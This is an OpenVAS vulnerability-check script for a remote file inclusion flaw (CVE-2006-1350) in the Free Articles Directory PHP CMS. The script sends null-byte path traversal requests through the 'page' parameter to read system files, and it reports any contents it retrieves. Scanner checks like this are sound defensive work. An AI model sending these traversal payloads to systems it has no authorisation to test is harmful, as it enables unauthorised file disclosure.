# OpenVAS Vulnerability Test
# $Id: free_articles_directory_file_includes.nasl 13543 2019-02-08 14:43:51Z cfischer $
# Description: Free Articles Directory Remote File Inclusion Vulnerability
#
# Authors:
# Josh Zlatin-Amishav (josh at ramat dot cc)
#
# Copyright:
# Copyright (C) 2008 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80060");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-1350");
  script_bugtraq_id(17183);
  script_name("Free Articles Directory Remote File Inclusion Vulnerability");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2008 Josh Zlatin-Amishav");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The remote web server contains a PHP application that is affected by a
  remote file include vulnerability.

  Description :

  The remote host is running Free Articles Directory, a CMS written in
  PHP.

  The installed version of Free Articles Directory fails to sanitize
  user input to the 'page' parameter in index.php.  An unauthenticated
  attacker may be able to read arbitrary local files or include a file
  from a remote host that contains commands which will be executed by
  the vulnerable script, subject to the privileges of the web server
  process.");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2006-03/0396.html");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

files = traversal_files();

# The '/99articles' directory does not seem too popular, but it is the default installation directory
foreach dir( make_list_unique( "/99articles", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach pattern(keys(files)) {

    file = files[pattern];

    foreach pattern(keys(files)) {

      file = files[pattern];

      url = string(dir, "/index.php?page=/" + file + "%00");
      req = http_get( item:url, port:port );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) continue;

      # There's a problem if...
      if (
        # there's an entry for root or...
        (
          'Website Powered by <strong><a href="http://www.ArticlesOne.com">ArticlesOne.com' >< res &&
          egrep(pattern:pattern, string:res)
        ) ||
        # we get an error saying "failed to open stream" or "Failed opening".
        #
        # nb: this suggests magic_quotes_gpc was enabled but passing
        #     remote URLs might still work.
        egrep(string:res, pattern:"Warning.+/" + file + ".+failed to open stream") ||
        egrep(string:res, pattern:"Warning.+ Failed opening '/" + file + ".+for inclusion")
      ) {
        if (egrep(pattern:pattern, string:res)) {
         content = strstr(res, "<input type=image name=subscribe");
          if (content) content = strstr(content, 'style="padding-left:10">');
          if (content) content = content - 'style="padding-left:10">';
          if (content) content = content - strstr(content, "</td>");
        }

        if (content)
          report = string(
            "Here are the contents of the file '/" + file + "' that\n",
            "It was possible to read from the remote host :\n",
            "\n",
            content
          );
        else report = "";

        security_message(port:port, data:report);
        exit(0);
      }
    }
  }
}

exit( 99 );